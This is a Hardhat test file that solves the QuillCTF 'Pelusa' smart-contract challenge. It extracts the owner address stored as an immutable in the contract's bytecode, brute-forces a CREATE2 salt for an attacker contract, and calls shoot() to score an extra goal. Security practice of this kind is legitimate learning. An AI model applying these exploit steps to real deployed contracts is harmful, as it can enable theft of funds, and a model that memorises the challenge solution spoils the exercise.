import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Pelusa, PelusaAttackerDeployer} from '../../types/typechain';

describe('QuillCTF 8: Pelusa', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: Pelusa;
  let attackerDeployer: PelusaAttackerDeployer;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Pelusa', owner).then(f => f.deploy());
    await contract.deployed();

    expect(await contract.goals()).to.eq(1);
  });

  it('should score a goal', async () => {
    // should deploy
    attackerDeployer = await ethers
      .getContractFactory('PelusaAttackerDeployer', attacker)
      .then(f => f.deploy(contract.address));
    await attackerDeployer.deployed();

    // immutables are stored directly within bytecode, rather than storage
    // we have to parse it from the bytecode
    // address can be found by analyzing the code at evm.codes/playground
    // or you can parse as follows
    const code = await ethers.provider.getCode(contract.address);
    const index = code.indexOf('7f000000000000000000000000'); // PUSH32 followed by 12byte zeros
    const pushLine = code.slice(index, index + 66);
    const ownerAddress = '0x' + pushLine.slice(26);
    expect(ownerAddress).to.be.properAddress;

    // randomly find the salt
    for (let i = 0; i < 2500; i++) {
      const s = ethers.utils.randomBytes(32);
      try {
        await attackerDeployer.connect(attacker).deployAttacker(ownerAddress, s);
        // console.log('Attempt:', i, '\tSalt:', Buffer.from(s).toString('hex'));
        break;
        // eslint-disable-next-line no-empty
      } catch (err) {}
    }
    // ensure deployment went right
    expect(await attackerDeployer.deployment()).to.not.eq(ethers.constants.AddressZero);

    // score the goal!
    await contract.connect(attacker).shoot();
  });

  after(async () => {
    expect(await contract.goals()).to.eq(2);
  });
});
